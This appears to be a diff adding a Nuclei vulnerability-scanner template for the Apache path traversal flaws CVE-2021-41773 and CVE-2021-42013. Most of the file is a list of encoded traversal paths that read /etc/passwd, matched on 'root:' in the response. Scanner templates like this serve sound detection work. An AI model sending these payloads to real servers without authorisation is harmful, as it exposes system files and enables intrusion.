@@ -1,0 +1,55 @@
+id: apache-path-traversal-passwd
+
+info:
+  name: Apache Path Traversal - /etc/passwd Exposure
+  author: psibot 
+  severity: critical
+  description: |
+    Detects Apache HTTP Server path traversal vulnerabilities (CVE-2021-41773, CVE-2021-42013)
+    by checking for exposure of /etc/passwd through various traversal techniques.
+  reference:
+    - https://httpd.apache.org/security/vulnerabilities_24.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-41773
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-42013
+    - https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/apache_normalize_path_rce
+  tags: cve,cve2021,apache,path-traversal,file-disclosure
+
+http:
+  - method: GET
+    path:
+      # Standard payloads
+      - "{{BaseURL}}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+      - "{{BaseURL}}/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+      
+      # Double encoded payloads
+      - "{{BaseURL}}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
+      - "{{BaseURL}}/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
+      
+      # Extended payloads
+      - "{{BaseURL}}/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
+      - "{{BaseURL}}/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
+      - "{{BaseURL}}/cgi-bin/.%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
+      - "{{BaseURL}}/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
+      - "{{BaseURL}}/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
+      
+      # Special payloads
+      - "{{BaseURL}}/cgi-bin/.%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
+      - "{{BaseURL}}/cgi-bin/%25%25%25%2e/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
+      
+      # Additional variations
+      - "{{BaseURL}}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+      - "{{BaseURL}}/cgi-bin/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+
+    matchers:
+      - type: word
+        words:
+          - "root:"
+        part: body
+      - type: status
+        status:
+          - 200
+        part: response
+        
+    headers:
+      User-Agent: "Nuclei-Scanner"
+      Accept: "*/*"
